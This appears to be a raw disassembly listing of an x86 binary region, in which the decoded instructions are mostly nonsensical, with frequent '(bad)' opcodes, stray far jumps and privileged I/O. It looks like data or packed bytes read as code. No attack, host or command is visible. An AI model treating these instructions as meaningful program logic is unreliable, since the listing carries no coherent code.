  42c74e:	(bad)  
  42c74f:	mov    ebx,edx
  42c751:	fwait
  42c752:	jl     0x42c6f1
  42c754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c755:	(bad)  
  42c756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c757:	add    DWORD PTR [edi-0x467128df],ebp
  42c75d:	pop    ss
  42c75e:	(bad)  
  42c75f:	mov    ecx,0x2a86c98
  42c764:	sub    BYTE PTR [esi-0x52365c6a],bh
  42c76a:	ret    
  42c76b:	mov    esp,0xc07db876
  42c770:	lahf   
  42c771:	pop    edx
  42c772:	dec    eax
  42c773:	pop    ebp
  42c774:	and    al,0xd
  42c776:	mov    bh,0xee
  42c778:	xor    dl,BYTE PTR cs:0x2e5a03d
  42c77f:	and    ecx,DWORD PTR [ebx-0x63015d7b]
  42c785:	sti    
  42c786:	inc    edi
  42c787:	out    0xbe,al
  42c789:	mov    dh,0x85
  42c78b:	stos   BYTE PTR es:[edi],al
  42c78c:	cmp    edi,DWORD PTR [ecx+ebx*4]
  42c78f:	mov    DWORD PTR [eax],0x0
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xd8cba40e
  42c802:	shr    BYTE PTR [ebx+0x1dbf4],0x4
  42c809:	add    DWORD PTR [eax],eax
  42c80b:	add    BYTE PTR [ebx+ebx*2],bh
  42c80e:	(bad)  
  42c80f:	cmc    
  42c810:	cmp    eax,0x55bf4a8e
  42c815:	mov    ecx,DWORD PTR [edx-0x5c]
  42c818:	ret    0x8d75
  42c81b:	mov    bl,0x34
  42c81d:	cmp    DWORD PTR [edx],esp
  42c81f:	xchg   ebp,eax
  42c820:	lahf   
  42c821:	loopne 0x42c7a7
  42c823:	cmp    al,0xfd
  42c825:	retf   
  42c826:	data16 jo 0x42c85c
  42c829:	pop    edi
  42c82a:	xchg   esi,eax
  42c82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c82c:	inc    edx
  42c82d:	or     dl,BYTE PTR [edx-0x53]
  42c830:	or     eax,0xb531f457
  42c835:	jns    0x42c88a
  42c837:	test   eax,0xd242039d
  42c83c:	(bad)  
  42c83d:	cs cmc 
  42c83f:	jl     0x42c849
  42c841:	push   esi
  42c842:	ss into 
  42c844:	inc    ebx
  42c845:	mov    al,ds:0x8be03a1e
  42c84a:	sub    cl,BYTE PTR [esi+0x6a8a817c]
  42c850:	inc    edi
  42c851:	xchg   BYTE PTR [edi],ah
  42c853:	idiv   DWORD PTR ds:0x849122c2
  42c859:	xchg   esi,eax
  42c85a:	push   es
  42c85b:	xchg   ebp,eax
  42c85c:	add    ch,BYTE PTR [esi-0x14]
  42c85f:	call   0x42639987
  42c864:	leave  
  42c865:	mov    ah,0xa1
  42c867:	in     eax,0xf7
  42c869:	or     cl,al
  42c86b:	and    BYTE PTR [eax],cl
  42c86d:	jns    0x42c86f
  42c86f:	jne    0x42c881
  42c871:	iret   
  42c872:	xchg   ebp,eax
  42c873:	gs push cs
  42c875:	fdiv   QWORD PTR [edi+ebp*1-0x7cd46682]
  42c87c:	jo     0x42c8a7
  42c87e:	xor    DWORD PTR [edi+0x5c516519],0x12bb353a
  42c888:	push   ds
  42c889:	adc    al,0x2b
  42c88b:	dec    esp
  42c88c:	fnstsw WORD PTR [ebx+esi*4-0x2a]
  42c890:	sbb    al,0x9
  42c892:	lock adc DWORD PTR cs:[edx-0x39],0xffffff89
  42c898:	mov    esp,0xbb6767cf
  42c89d:	cdq    
  42c89e:	loop   0x42c886
  42c8a0:	daa    
  42c8a1:	sbb    BYTE PTR [esi],ah
  42c8a3:	fimul  DWORD PTR [edx-0x27]
  42c8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8a7:	xchg   edx,eax
  42c8a8:	cmp    edx,esi
  42c8aa:	in     eax,0x1e
  42c8ac:	jno    0x42c8e4
  42c8ae:	push   esp
  42c8af:	pop    ss
  42c8b0:	retf   0x4d6b
  42c8b3:	mov    ch,0x19
  42c8b5:	loope  0x42c8b0
  42c8b7:	add    ah,dh
  42c8b9:	btr    DWORD PTR [esi+0x3e910edb],esi
  42c8c0:	or     BYTE PTR [edi],bh
  42c8c2:	enter  0x754e,0x6f
  42c8c6:	xchg   ebx,eax
  42c8c7:	pushf  
  42c8c8:	inc    edi
  42c8c9:	mov    ss:0xfaa9d94e,al
  42c8cf:	jg     0x42c8f8
  42c8d1:	fwait
  42c8d2:	sbb    BYTE PTR [esp+edi*2+0x6055e890],0xbd
  42c8da:	mov    edi,DWORD PTR [eax-0xe9a9771]
  42c8e0:	fwait
  42c8e1:	lahf   
  42c8e2:	add    ebx,ecx
  42c8e4:	test   eax,0xdc655096
  42c8e9:	mov    bh,ch
  42c8eb:	cli    
  42c8ec:	dec    edx
  42c8ed:	sub    al,0xa
  42c8ef:	cdq    
  42c8f0:	dec    ebx
  42c8f1:	(bad)  
  42c8f2:	(bad)  
  42c8f4:	stos   DWORD PTR es:[edi],eax
  42c8f5:	push   cs
  42c8f6:	loope  0x42c8ce
  42c8f8:	(bad)  
  42c8f9:	mov    DWORD PTR [ebp+0x605d1ccf],edi
  42c8ff:	jp     0x42c940
  42c901:	stc    
  42c902:	inc    edi
  42c903:	xchg   ecx,eax
  42c904:	pop    ebx
  42c905:	adc    BYTE PTR [ecx+0x3b83e1c4],0xfc
  42c90c:	stos   DWORD PTR es:[edi],eax
  42c90d:	retf   
  42c90e:	stos   BYTE PTR es:[edi],al
  42c90f:	add    BYTE PTR es:[eax],al
	...
  42c972:	add    BYTE PTR [eax],al
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xb9e72ed1
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	mov    eax,0x461f1be
  42c991:	(bad)  
  42c992:	xchg   esi,eax
  42c993:	mov    ds:0x93fa3399,al
  42c998:	icebp  
  42c999:	mov    ebx,0x258d67e1
  42c99e:	or     al,0x5b
  42c9a0:	fistp  WORD PTR [edx+0x14]
  42c9a3:	iret   
  42c9a4:	jmp    0xddc4:0x7c38df47
  42c9ab:	outs   dx,BYTE PTR ds:[esi]
  42c9ac:	mov    bl,0x6b
  42c9ae:	mov    esp,0xd32ade7c
  42c9b3:	jl     0x42ca2d
  42c9b5:	repnz fimul DWORD PTR [esi+0x28be986c]
  42c9bc:	aad    0x1f
  42c9be:	clc    
  42c9bf:	(bad)  
  42c9c0:	pop    ecx
  42c9c1:	mov    ecx,0x8a021f70
  42c9c6:	daa    
  42c9c7:	sub    eax,DWORD PTR [ebx-0x7ff1a7e5]
  42c9cd:	push   esi
  42c9ce:	scas   eax,DWORD PTR es:[edi]
  42c9cf:	ret    
  42c9d0:	lahf   
  42c9d1:	xchg   edi,eax
  42c9d2:	jns    0x42ca0b
  42c9d4:	mov    al,ds:0x80abb36d
  42c9d9:	nop
  42c9da:	fsubr  DWORD PTR [ebx]
  42c9dc:	mov    cl,ah
  42c9de:	jb     0x42c9c4
  42c9e0:	xchg   ebp,eax
  42c9e1:	cld    
  42c9e2:	and    eax,0xec56b7e7
  42c9e7:	mov    ch,0xca
  42c9e9:	and    BYTE PTR [ecx],dl
  42c9eb:	push   0x645a601f
  42c9f0:	retf   0x7015
  42c9f3:	pop    ecx
  42c9f4:	or     al,0x2
  42c9f6:	int    0x72
  42c9f8:	fld    DWORD PTR [esi-0x7a0a765]
  42c9fe:	(bad)  
  42c9ff:	jae    0x42c9fc
  42ca01:	imul   esp,DWORD PTR [ecx-0x4f83d195],0xffffffc9
  42ca08:	repz dec ecx
  42ca0a:	pop    es
  42ca0b:	inc    edi
  42ca0c:	arpl   WORD PTR [ebx],dx
  42ca0e:	pop    edi
  42ca0f:	xor    al,0xff
  42ca11:	fbld   TBYTE PTR [ebx+0x40ed3406]
  42ca17:	imul   DWORD PTR [ebp-0x5fb69d40]
  42ca1d:	sub    BYTE PTR [ebp-0x25],al
  42ca20:	jne    0x42ca1b
  42ca22:	idiv   DWORD PTR ds:0x65c56ceb
  42ca28:	lock mov dl,0x7b
  42ca2b:	sti    
  42ca2c:	or     cl,BYTE PTR [edi-0x60ca53c0]
  42ca32:	imul   edi,DWORD PTR [ebp-0x718ee18b],0x3f58aef4
  42ca3c:	mov    al,ds:0xeee210a9
  42ca41:	fistp  QWORD PTR [ecx-0x2e4a3ff4]
  42ca47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca48:	ss inc edx
  42ca4a:	stos   DWORD PTR es:[edi],eax
  42ca4b:	jns    0x42ca96
  42ca4d:	push   ds
  42ca4e:	sbb    DWORD PTR [edx],ecx
  42ca50:	mov    ch,0x6d
  42ca52:	mov    edi,0x9a98959f
  42ca57:	or     eax,DWORD PTR [edx+0x136e59a]
  42ca5d:	dec    ecx
  42ca5e:	inc    esp
  42ca5f:	loope  0x42ca64
  42ca61:	std    
  42ca62:	xchg   ebp,eax
  42ca63:	add    BYTE PTR [eax+eax*4],ch
  42ca66:	or     ch,BYTE PTR [edx+0x377c4c69]
  42ca6c:	and    BYTE PTR [edx+edx*2+0x77dd1a6b],bh
  42ca73:	jge    0x42caa8
  42ca75:	mov    eax,ds:0xf5a53281
  42ca7a:	inc    esi
  42ca7b:	add    ch,BYTE PTR [edx]
  42ca7d:	inc    ebx
  42ca7e:	xchg   edx,eax
  42ca7f:	sub    eax,0xaf307507
  42ca84:	xchg   esi,eax
  42ca85:	mov    BYTE PTR [edx],ah
  42ca87:	adc    eax,0xe680fe84
  42ca8c:	adc    ah,al
  42ca8e:	loop   0x42caf8
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x7a029140]
  42cb02:	mov    WORD PTR [ebx-0x4],ds
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	push   esp
  42cb0d:	dec    ebx
  42cb0e:	pushf  
  42cb0f:	shl    DWORD PTR [eax+0x55],cl
  42cb12:	mov    edx,0xab63c715
  42cb17:	rcr    DWORD PTR [edi+0x70],cl
  42cb1a:	pop    edx
  42cb1b:	aam    0x4e
  42cb1d:	push   es
  42cb1e:	add    DWORD PTR [eax],esi
  42cb20:	adc    al,BYTE PTR [edx]
  42cb22:	push   ecx
  42cb23:	in     eax,dx
  42cb24:	adc    esp,0x4f
  42cb27:	mov    ebx,0x17b9c0c5
  42cb2c:	jecxz  0x42cab8
  42cb2e:	dec    esi
  42cb2f:	or     BYTE PTR [eax],bl
  42cb31:	sbb    dh,dl
  42cb33:	mov    al,0x44
  42cb35:	test   edx,edx
  42cb37:	ret    
  42cb38:	mov    dh,0x34
  42cb3a:	mov    ds:0x81c40caa,eax
  42cb3f:	dec    eax
  42cb40:	xor    esp,ebp
  42cb42:	xchg   edi,eax
  42cb43:	gs mov bh,0x31
  42cb46:	popa   
  42cb47:	ins    DWORD PTR es:[edi],dx
  42cb48:	sbb    eax,0x45b15a72
  42cb4d:	xchg   esp,eax
  42cb4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb4f:	test   DWORD PTR [edx],ebx
  42cb51:	fstp   DWORD PTR [ecx]
  42cb53:	out    dx,eax
  42cb54:	dec    ecx
  42cb55:	add    BYTE PTR [esp+esi*8],dh
  42cb58:	(bad)  
  42cb59:	mov    esi,0x5227fbe7
  42cb5e:	dec    ebp
  42cb5f:	cli    
  42cb60:	push   cs
  42cb61:	clc    
  42cb62:	repnz push 0x5d
  42cb65:	xor    ah,BYTE PTR [ebx+0x20]
  42cb68:	cld    
  42cb69:	sahf   
  42cb6a:	push   0xe3e8e77f
  42cb6f:	cmp    eax,0xc2c0ab90
  42cb74:	xchg   edi,eax
  42cb75:	mov    ah,BYTE PTR [ebp+0x2e42d948]
  42cb7b:	stos   BYTE PTR es:[edi],al
  42cb7c:	imul   ebp,ebp,0x67806868
  42cb82:	mov    esi,0xe75abcc7
  42cb87:	in     eax,dx
  42cb88:	push   ecx
  42cb89:	mov    dh,0x8a
  42cb8b:	(bad)  
  42cb8d:	adc    dl,BYTE PTR [eax+0x44]
  42cb90:	and    esp,ebx
  42cb92:	jmp    0x975a:0xbf57f94e
  42cb99:	aas    
  42cb9a:	(bad)  
  42cb9b:	push   ss
  42cb9c:	imul   ecx,DWORD PTR [edx+0x59],0xffffff87
  42cba0:	dec    ebp
  42cba1:	pop    ecx
  42cba2:	inc    ecx
  42cba3:	dec    esi
  42cba4:	iret   
  42cba5:	cmp    al,0x51
  42cba7:	sbb    eax,0x2fbad9da
  42cbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbad:	pop    esi
  42cbae:	ins    DWORD PTR es:[edi],dx
  42cbaf:	mov    dl,0x47
  42cbb1:	pushf  
  42cbb2:	mov    ch,0xf0
  42cbb4:	lock pop ss
  42cbb6:	dec    ebx
  42cbb7:	mov    ds:0x9d5f22ce,al
  42cbbc:	cdq    
  42cbbd:	adc    ebp,DWORD PTR [edi-0xeead6fd]
  42cbc3:	sbb    dl,bl
  42cbc5:	xor    bl,BYTE PTR [edx-0x36b5bd8b]
  42cbcb:	call   0xeaf36351
  42cbd0:	and    cl,BYTE PTR [ecx+0x3c]
  42cbd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbd4:	je     0x42cb70
  42cbd6:	inc    BYTE PTR [ecx+0x66]
  42cbd9:	add    bl,BYTE PTR [edx]
  42cbdb:	cmp    DWORD PTR [eax+0x0],0xb9f1708
  42cbe2:	adc    ebp,ecx
  42cbe4:	jae    0x42cc38
  42cbe6:	cli    
  42cbe7:	dec    ecx
  42cbe8:	cli    
  42cbe9:	mov    cl,0xfb
  42cbeb:	dec    edx
  42cbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbed:	add    ebx,DWORD PTR ds:0x6b34c8f3
  42cbf3:	ror    ah,cl
  42cbf5:	stos   DWORD PTR es:[edi],eax
  42cbf6:	test   eax,0xbd1b891e
  42cbfb:	sti    
  42cbfc:	push   edi
  42cbfd:	push   es
  42cbfe:	nop
  42cbff:	xor    al,0x59
  42cc01:	pop    edi
  42cc02:	adc    BYTE PTR [esi-0x3b],bl
  42cc05:	int3   
  42cc06:	pop    ecx
  42cc07:	jmp    0xbd47:0x5dd858ff
  42cc0e:	dec    ebp
  42cc0f:	push   0x0
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x8893adab
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	loop   0x42cc60
  42cc8e:	pop    ebp
  42cc8f:	adc    bl,BYTE PTR ds:[ecx]
  42cc92:	xor    eax,0x64e0fe69
  42cc97:	add    esi,eax
  42cc99:	int    0x35
  42cc9b:	add    al,0xd1
  42cc9d:	es scas eax,DWORD PTR es:[edi]
  42cc9f:	fidivr WORD PTR [ecx-0x6f]
  42cca2:	xchg   ebx,eax
  42cca3:	outs   dx,BYTE PTR ds:[esi]
  42cca4:	mov    edx,0xe39f62e2
  42cca9:	mov    BYTE PTR ds:0xdd46422e,bl
  42ccaf:	xchg   edi,eax
  42ccb0:	and    dl,BYTE PTR [ebx+eax*2+0x52]
  42ccb4:	mov    ah,0xf6
  42ccb6:	cmp    ch,ch
  42ccb8:	pop    esi
  42ccb9:	adc    dl,BYTE PTR ds:0xdd0837b5
  42ccbf:	popf   
  42ccc0:	mov    WORD PTR [ebx+0x23],cs
  42ccc3:	fwait
  42ccc4:	adc    cl,ch
  42ccc6:	or     DWORD PTR [ecx+edx*2+0x32],0xffffff88
  42cccb:	es xchg ebp,eax
  42cccd:	xchg   ebx,eax
  42ccce:	addr16 xchg ebx,eax
  42ccd0:	aaa    
  42ccd1:	mov    dh,0x4e
  42ccd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccd4:	loope  0x42cd15
  42ccd6:	pop    edi
  42ccd7:	je     0x42ccfa
  42ccd9:	push   edi
  42ccda:	or     eax,DWORD PTR [eax]
  42ccdc:	out    dx,eax
  42ccdd:	hlt    
  42ccde:	add    dh,al
  42cce0:	mov    ss,WORD PTR [eax]
  42cce2:	aad    0xb3
  42cce4:	push   edi
  42cce5:	ss mov al,ds:0x80d5aab1
  42ccec:	dec    ecx
  42cced:	or     eax,0x9d2e8876
  42ccf2:	idiv   BYTE PTR [edx+edx*2+0x4cf4fa50]
  42ccf9:	imul   ecx,esi,0x4e0013b
  42ccff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cd01:	mov    ah,bl
  42cd03:	sbb    al,0xbd
  42cd05:	mov    ebx,0x1900ddb3
  42cd0a:	jp     0x42cce2
  42cd0c:	pushf  
  42cd0d:	stos   DWORD PTR es:[edi],eax
  42cd0e:	shl    DWORD PTR [ebx],1
  42cd10:	sahf   
  42cd11:	cli    
  42cd12:	sub    dl,BYTE PTR [edi+0x414f67ab]
  42cd18:	loop   0x42ccb2
  42cd1a:	pop    eax
  42cd1b:	xchg   ecx,eax
  42cd1c:	sub    al,0xee
  42cd1e:	xor    bh,BYTE PTR [esi+0x594a0f29]
  42cd24:	out    0xa9,al
  42cd26:	xor    al,0xb9
  42cd28:	inc    ebx
  42cd29:	mov    es,WORD PTR [ecx-0x53]
  42cd2c:	jo     0x42cd0a
  42cd2e:	lahf   
  42cd2f:	nop
  42cd30:	sub    eax,ecx
  42cd32:	add    cl,BYTE PTR [edi]
  42cd34:	xchg   dl,cl
  42cd36:	test   eax,0x1daa41cb
  42cd3b:	pop    edx
  42cd3c:	jne    0x42cd72
  42cd3e:	enter  0xa673,0x94
  42cd42:	mov    ds:0x7645f412,eax
  42cd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd48:	inc    ebp
  42cd49:	push   edx
  42cd4a:	inc    ebp
  42cd4b:	arpl   WORD PTR [eax-0x33],ax
  42cd4e:	push   ecx
  42cd4f:	xor    al,0x90
  42cd51:	inc    ecx
  42cd52:	mov    ?,WORD PTR [edx-0x6c]
  42cd55:	pushf  
  42cd56:	(bad)  
  42cd57:	aad    0xb2
  42cd59:	adc    DWORD PTR ds:0x766564fb,ecx
  42cd5f:	mov    edi,0xfdcfc9c6
  42cd64:	cmp    ch,BYTE PTR [ecx-0x224cdd01]
  42cd6a:	gs push ss
  42cd6c:	jns    0x42cdb0
  42cd6e:	cmp    al,0xfa
  42cd70:	jae    0x42cd7a
  42cd72:	nop
  42cd73:	sbb    ch,dl
  42cd75:	inc    eax
  42cd76:	jns    0x42cd5d
  42cd78:	(bad)  
  42cd7a:	mov    al,0x23
  42cd7c:	mov    ds:0x1a887db1,eax
  42cd81:	add    bl,ah
  42cd83:	mov    dh,0x2e
  42cd85:	lahf   
  42cd86:	sbb    DWORD PTR [edi+0x53790585],esi
  42cd8c:	pop    ds
  42cd8d:	or     DWORD PTR [esi+0xb4],ebx
	...
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xb3
  42ce01:	repnz push ebx
  42ce03:	rol    BYTE PTR [eax+eiz*8],cl
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	push   ecx
  42ce0d:	pop    esi
  42ce0e:	bound  edi,QWORD PTR [ebp+0x61]
  42ce11:	xchg   DWORD PTR [ebp-0x5e],ebx
  42ce14:	fld    DWORD PTR [ecx]
  42ce16:	out    dx,al
  42ce17:	dec    eax
  42ce18:	sbb    al,0x94
  42ce1a:	mov    ds:0x7a8cf76,eax
  42ce1f:	test   cl,ch
  42ce21:	call   0xe2c8:0x7900ff90
  42ce28:	push   ds
  42ce29:	adc    al,0x9f
  42ce2b:	add    al,0xfb
  42ce2d:	cmp    ebx,DWORD PTR [eax+0x36]
  42ce30:	dec    esi
  42ce31:	ror    edi,1
  42ce33:	xchg   esp,eax
  42ce34:	adc    edx,DWORD PTR [esi]
  42ce36:	ffree  st(7)
  42ce38:	in     al,0x6a
  42ce3a:	sub    DWORD PTR [ecx+ebp*4+0x55],esp
  42ce3e:	mov    DWORD PTR [esi+0x4b0d345b],ebx
  42ce44:	sub    dh,BYTE PTR [edi]
  42ce46:	rol    DWORD PTR [ebp-0x3ef4506f],0x10
  42ce4d:	jnp    0x42cdfd
  42ce4f:	call   0xccd0:0xfef95654
  42ce56:	push   edi
  42ce57:	jbe    0x42ce8e
  42ce59:	push   ebp
  42ce5a:	or     DWORD PTR [eax+0x3fbcef86],ebx
  42ce60:	mov    dh,0xd4
  42ce62:	mov    ds:0x3394239e,eax
  42ce67:	sub    BYTE PTR [ebx+0x53],al
  42ce6a:	pushf  
  42ce6b:	sbb    al,0x58
  42ce6d:	div    DWORD PTR [edi]
  42ce6f:	mov    ah,0x31
  42ce71:	lods   al,BYTE PTR ds:[esi]
  42ce72:	jge    0x42cef2
  42ce74:	in     eax,dx
  42ce75:	jp     0x42ce0e
  42ce77:	xor    al,0x14
  42ce79:	inc    ebp
  42ce7a:	xchg   esi,eax
  42ce7b:	ds lock ret 0x3b29
  42ce80:	xchg   esi,eax
  42ce81:	xchg   edx,eax
  42ce82:	loope  0x42ce34
  42ce84:	inc    edx
  42ce85:	mov    cl,0xd2
  42ce87:	clc    
  42ce88:	stos   DWORD PTR es:[edi],eax
  42ce89:	push   ss
  42ce8a:	sub    eax,0x57161877
  42ce8f:	sub    ch,ah
  42ce91:	ins    DWORD PTR es:[edi],dx
  42ce92:	rcr    DWORD PTR [edx+0x2f3c655a],0xdb
  42ce99:	and    esi,0xd
  42ce9c:	xchg   ebx,eax
  42ce9d:	pop    eax
  42ce9e:	jg     0x42cecd
  42cea0:	and    ch,BYTE PTR [ebx]
  42cea2:	mov    ch,0x67
  42cea4:	cmc    
  42cea5:	mov    edx,0x6ebf67e4
  42ceaa:	fs stos DWORD PTR es:[edi],eax
  42ceac:	rol    DWORD PTR [edx-0x78],1
  42ceaf:	sar    BYTE PTR [edi-0xc],cl
  42ceb2:	add    dh,BYTE PTR [esp+eax*8-0x17aa5f22]
  42ceb9:	cmp    DWORD PTR [ebx+ebp*8-0x34],eax
  42cebd:	jo     0x42ceb7
  42cebf:	or     al,0x8e
  42cec1:	or     eax,0xbd8a2531
  42cec6:	fst    QWORD PTR [ebp+0x48]
  42cec9:	cdq    
  42ceca:	add    DWORD PTR [edi-0x18b17adc],0xe5b463e
  42ced4:	sbb    eax,0x902cafe
  42ced9:	jmp    0x42ced7
  42cedb:	sbb    ah,BYTE PTR [edx]
  42cedd:	adc    eax,0x5181032c
  42cee2:	jl     0x42cf04
  42cee4:	fisttp WORD PTR [edi-0x30]
  42cee7:	dec    ecx
  42cee8:	mov    ch,0x7e
  42ceea:	out    dx,al
  42ceeb:	and    esp,DWORD PTR [ecx-0x30aaed6a]
  42cef1:	inc    edi
  42cef2:	mov    ecx,0xebc73784
  42cef7:	inc    ebp
  42cef8:	call   0x2eb0:0x931fd482
  42ceff:	outs   dx,BYTE PTR ds:[esi]
  42cf00:	dec    eax
  42cf01:	not    ch
  42cf03:	je     0x42cf4c
  42cf05:	(bad)
  42cf08:	xor    BYTE PTR [edx-0x51],al
  42cf0b:	jns    0x42ced2
  42cf0d:	pminsw mm2,QWORD PTR [ecx+0x0]
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR ds:0x87f11d5
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	addr16 mov al,0x6d
  42cf8f:	aad    0x75
  42cf91:	(bad)  
  42cf92:	iret   
  42cf93:	cmp    al,0x7a
  42cf95:	fdivr  DWORD PTR [ebx]
  42cf97:	jb     0x42cf58
  42cf99:	push   cs
  42cf9a:	jmp    0xbbaf:0xc4a51f32
  42cfa1:	add    al,0x74
  42cfa3:	imul   esp,DWORD PTR [ecx+0x5f],0x129d8b19
  42cfaa:	and    BYTE PTR [eax],dh
  42cfac:	hlt    
  42cfad:	mov    edi,0x95b3cfec
  42cfb2:	fimul  WORD PTR [eax-0x3c9bad95]
  42cfb8:	stc    
  42cfb9:	xor    edi,DWORD PTR [edx+0x1]
  42cfbc:	lods   al,BYTE PTR ds:[esi]
  42cfbd:	push   ecx
  42cfbe:	out    0x58,eax
  42cfc0:	dec    ebx
  42cfc1:	push   0x9a2faebf
  42cfc6:	mov    ch,0x61
  42cfc8:	lods   al,BYTE PTR ds:[esi]
  42cfc9:	pop    edi
  42cfca:	jmp    0xc5f0:0x9e78ae75
  42cfd1:	and    ebx,DWORD PTR [eax-0x1a698429]
  42cfd7:	in     al,0x36
  42cfd9:	xchg   ebx,eax
  42cfda:	(bad)  
  42cfdb:	xor    eax,0xa092f226
  42cfe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfe1:	sub    DWORD PTR [edx-0x1a4e39e7],0xffffff8a
  42cfe8:	mov    al,ds:0x3229300
  42cfed:	outs   dx,BYTE PTR ds:[esi]
  42cfee:	pop    ds
  42cfef:	icebp  
  42cff0:	enter  0xfdbc,0x36
  42cff4:	sub    DWORD PTR [edx+0x72],eax
  42cff7:	xchg   esi,eax
  42cff8:	rcr    DWORD PTR [esp+esi*2-0x674eb6f7],0x2d
  42d000:	sub    al,0x42
  42d002:	dec    edi
  42d003:	out    0xa8,al
  42d005:	dec    esi
  42d006:	(bad)  
  42d007:	sub    al,0x9d
  42d009:	fnstcw WORD PTR [eax-0x60]
  42d00c:	cmp    DWORD PTR [ecx],ebp
  42d00e:	out    0x60,eax
  42d010:	mov    WORD PTR [ebp+0x20],?
  42d013:	data16 (bad) 
  42d015:	(bad)  
  42d016:	clc    
  42d017:	aaa    
  42d018:	pop    ebx
  42d019:	mov    dl,BYTE PTR [edx]
  42d01b:	pop    ebx
  42d01c:	pop    eax
  42d01d:	adc    ebp,DWORD PTR [ecx+0x73036f4b]
  42d023:	mov    esi,0x1b2af9fd
  42d028:	mov    ebp,0x5de2348b
  42d02d:	dec    ebx
  42d02e:	mov    BYTE PTR [ebx+ebp*8-0x2ffe3e7],cl
  42d035:	push   ds
  42d036:	sbb    eax,0xba06718a
  42d03b:	push   DWORD PTR [edi]
  42d03d:	in     al,dx
  42d03e:	xor    BYTE PTR [ebp+edi*2-0x3],dl
  42d042:	cmp    cl,cl
  42d044:	das    
  42d045:	push   0x1767feba
  42d04a:	ds aam 0x1f
  42d04d:	test   DWORD PTR [esi+0x3876a069],edx
  42d053:	xor    DWORD PTR [ebx+edx*4],edi
  42d056:	leave  
  42d057:	rcl    DWORD PTR [ebx+0x2f],1
  42d05a:	aam    0xcd
  42d05c:	push   esp
  42d05d:	sbb    al,0xe4
  42d05f:	and    al,0x71
  42d061:	lds    ecx,FWORD PTR [esi-0x38]
  42d064:	fcom   QWORD PTR [edi+0x597f834f]
  42d06a:	test   BYTE PTR ds:0x4a1bcd,cl
  42d070:	jnp    0x42d011
  42d072:	cmc    
  42d073:	mov    eax,ds:0x2cf45cc4
  42d078:	out    0xd3,al
  42d07a:	xchg   BYTE PTR [edi-0x127aad6],ah
  42d080:	cwde   
  42d081:	aaa    
  42d082:	mov    eax,ds:0xc71a515b
  42d087:	fldcw  WORD PTR [ebx]
  42d089:	jo     0x42d0ee
  42d08b:	push   es
  42d08c:	mov    WORD PTR [esi],cs
  42d08e:	push   ecx
  42d08f:	rol    DWORD PTR [eax],cl
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    ah,cl
  42d101:	ror    DWORD PTR [ebp-0x45],cl
  42d104:	or     al,0xe2
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	inc    esi
  42d10d:	leave  
  42d10e:	cmp    DWORD PTR [esi+0x23eb1b3b],ebx
  42d114:	and    edx,DWORD PTR [ecx-0x1b]
  42d117:	jne    0x42d0b5
  42d119:	jecxz  0x42d0d5
  42d11b:	in     al,dx
  42d11c:	xor    BYTE PTR [ebx+ebp*1+0x2],cl
  42d120:	push   esi
  42d121:	sub    dh,BYTE PTR [ecx-0x5c74c358]
